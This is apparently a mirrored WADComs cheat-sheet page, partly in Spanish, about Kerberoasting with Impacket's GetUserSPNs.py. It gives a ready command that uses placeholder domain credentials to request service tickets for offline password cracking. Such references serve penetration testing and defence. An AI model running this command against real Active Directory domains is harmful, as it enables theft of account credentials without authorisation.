# WADComs: Impacket-GetUserSPNs

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[WADComs|Índice WADComs]]

> Fuente: [https://wadcoms.github.io/](https://wadcoms.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

WADComs — comandos para Active Directory, ordenados por lo que TENES.

**Lo que tenés:** `Password`, `Username`

**Sistema:** `Linux`, `Windows`

## Descripción

Impacket's GetUserSPNs.py will attempt to fetch Service Principal Names that are associated with normal user accounts. What is returned is a ticket that is encrypted with the user account's password, which can then be bruteforced offline.

Command Reference:

	Target IP: 10.10.10.1

	Domain: test.local

	Username: john

	Password: password123

## Comando

```bash
python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request
```

## Referencias

- https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
- https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
